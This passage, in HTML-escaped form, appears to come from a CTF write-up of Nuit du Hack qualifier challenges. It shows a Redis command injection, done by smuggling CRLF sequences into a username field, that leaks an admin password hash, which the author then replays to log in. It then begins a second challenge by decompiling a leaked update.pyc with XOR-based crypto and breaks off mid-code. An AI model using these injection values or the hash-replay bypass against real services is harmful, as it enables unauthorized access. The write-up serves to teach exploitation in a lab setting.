[~] Server sent challenge : uJ2A8UE1WMwYCgWDmOMZSVirPWQoxhWAVeECAwWOVUxXD9q6qqvqGPSpolKr5KX1 !
[+] Auth data : AUTH username&amp;#39;|a932aed6531ebf37074484e10611499007dadd6c42f69649a242302c09245792
[~] Sending auth packet...
[!] Authentification Error : Valid response code but no user data received : -ERR Protocol error: unbalanced quotes in request
[-] Bad password or authentification error... !
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Redis&lt;/h3&gt;
&lt;p&gt;The error &lt;code&gt;unbalanced quotes in request&lt;/code&gt; seems to be from a Redis server, a
NoSQL engine. We can see this precise error in the
&lt;a href="http://download.redis.io/redis-stable/src/networking.c"&gt;&lt;code&gt;networking.c&lt;/code&gt;&lt;/a&gt; file
of the project.&lt;/p&gt;
&lt;p&gt;We replace the username with &lt;code&gt;admin\x0A\x0D&lt;/code&gt; in order to finish the command and
obtain :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;spl3en@box:~$ python SecureAuthClient.py
[~] Server sent challenge : OFJUOFLbDdR49FHeNMUH4FX7VFIUPxiASDKIaXpZvtIELU3Yo333ICcUmIZFfVWB !
[+] Auth data : AUTH username |e72fd1858578774bfbee00196992db55f7697833746053a2390a73f4616c60da
[~] Sending auth packet...
[+] Welcome -ERR unknown command &amp;#39;:name&amp;#39; we are verifying your password...
[-] Bad password or authentification error... !
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We notice the prefix &lt;code&gt;:name&lt;/code&gt; which have been interpreted as a second command.&lt;/p&gt;
&lt;h3&gt;Command injection&lt;/h3&gt;
&lt;p&gt;We try to inject &lt;a href="http://redis.io/commands"&gt;Redis commands&lt;/a&gt; like &lt;code&gt;INFO&lt;/code&gt; by
replacing the username with &lt;code&gt;admin\x0A\x0DINFO\x0A\x0D&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;spl3en@box:~$ python SecureAuthClient.py
[~] Server sent challenge : JrLFTYYrDxYibypIBzkdmALAzDCoYe9olBMEZ2OXEDuqsrFFISLzLhWMkeFOdRCB !
[+] Auth data : AUTH admin
INFO
|30247cdea2397657332d6f35b4c2a4340b83e3a842a17119704f31185a41cbe3
[~] Sending auth packet...
[+] Welcome -ERR unknown command &amp;#39;INFO&amp;#39; we are verifying your password...

[-] Bad password or authentification error... !
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The &lt;code&gt;INFO&lt;/code&gt; commend is not recognize. After several tests, we see that all
commands but &lt;code&gt;GET&lt;/code&gt; seems filtrated. We suppose that the one used to get the
username and the password in the NoSQL database. With &lt;/p&gt;
&lt;p&gt;The requests on the server should be something like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;username = GET &amp;amp;lt;user&amp;amp;gt;:name
password = GET &amp;amp;lt;user&amp;amp;gt;:password
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We try to inject &lt;code&gt;admin:password\x0A\x0D&lt;/code&gt; in the username, that will give us:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;username = GET admin:password\x0A\x0D:name
password = GET admin:password\x0A\x0D:password
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(The name and password at the end of each line would not be interpreted).&lt;/p&gt;
&lt;p&gt;We execute the program with &lt;code&gt;admin:password\x0A\x0D&lt;/code&gt; as a username:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;spl3en@box:~$ python SecureAuthClient.py
[~] Server sent challenge : DsHn1UJH7LjPSpVOIuZwh7QUgEZ1qGXnK8sHxBYnSTsaWNdVYDvHG5UCPTrvL2AJ !
[+] Auth data : AUTH admin:password
|606611cc808eabd5e38bed8e21360b52127f3e2cecbf02413c3da90fa43c71a3
[~] Sending auth packet...
[+] Welcome 837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529 we are verifying your password...

[-] Bad password or authentification error... !
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As excepted the server show us the username that we replace by its hashed
password. We get the &lt;code&gt;sha256(admin_passwd)&lt;/code&gt;:
&lt;code&gt;837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We replace the corresponding python code to directly send the hash:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AUTH &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;|&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;authtoken&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Become:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;AUTH &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;|&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;challenge&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We execute the script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;spl3en@box:~$ python SecureAuthClient.py
[~] Server sent challenge : elQQpNHPDlDk1FO9RUiqDfUyUBRpFGMJ5NuBkGTGnGVYW9SCRluSYlcNQnJYkSHP !
[+] Auth data : AUTH admin:password
|8baf1cc43bbe6316ed5959cd8efd2fd8f23d9bae441d4a8134277cd973fcaec4
[~] Sending auth packet...
[+] Welcome 837a135ad3ccb1978f169aa62a62a028b76ec42b2284791bd4703421ec050529 we are verifying your password...

[+] Congrats. The flag is : *INSERT_FUNNY_QUOTE_HERE*
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Flag: *INSERT_FUNNY_QUOTE_HERE*&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Updator&lt;/h1&gt;
&lt;p&gt;Exploit  |  200 points  |  http://quals.nuitduhack.com/challenges/view/9&lt;/p&gt;
&lt;p&gt;http://updator.challs.nuitduhack.com/&lt;/p&gt;
&lt;h2&gt;Statement&lt;/h2&gt;
&lt;p&gt;*Unhackable : "Not hackable; that cannot be hacked or broken into."&lt;/p&gt;
&lt;p&gt;We manage updates and thus have fixes, this is not a PS3 as it is unhackableâ¦
or is it?*&lt;/p&gt;
&lt;h2&gt;Challenge&lt;/h2&gt;
&lt;p&gt;The website is a simple page with a login interface for witch we do not have any
credentials and a &lt;strong&gt;Update&lt;/strong&gt; button.
When clicking on the button we got the following message from the page
http://updator.challs.nuitduhack.com/update.py:
&lt;em&gt;The update managing system is still under construction but will be available soon.&lt;/em&gt;&lt;/p&gt;
&lt;h3&gt;robots.txt&lt;/h3&gt;
&lt;p&gt;The file &lt;code&gt;robots.txt&lt;/code&gt; reveal the folder temp/:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Disallow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="o"&gt;/*&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In this folder we found a file &lt;code&gt;log.py.encrypted&lt;/code&gt;. How can we decipher it ?&lt;/p&gt;
&lt;h3&gt;pyc&lt;/h3&gt;
&lt;p&gt;The &lt;strong&gt;Update&lt;/strong&gt; button call a &lt;code&gt;update.py&lt;/code&gt; file therefor we can try for the
compiled version of it with the .pyc extension as confirmed by the page
http://updator.challs.nuitduhack.com/update.pyc&lt;/p&gt;
&lt;p&gt;We must decompile this file, we will use
&lt;a href="https://github.com/wibiti/uncompyle2"&gt;uncompyle2&lt;/a&gt;. The output is the following
python program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;config&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="n"&gt;KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;arg&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;cipher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;arg&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]:&lt;/span&gt;
        &lt;span class="n"&gt;cipher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;])&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;cipher&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Crypto&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

    &lt;span class="nd"&gt;@staticmethod&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ljust&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;blocks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;.encrypted&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;

            &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="nd"&gt;@staticmethod&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;blocks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;plain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;

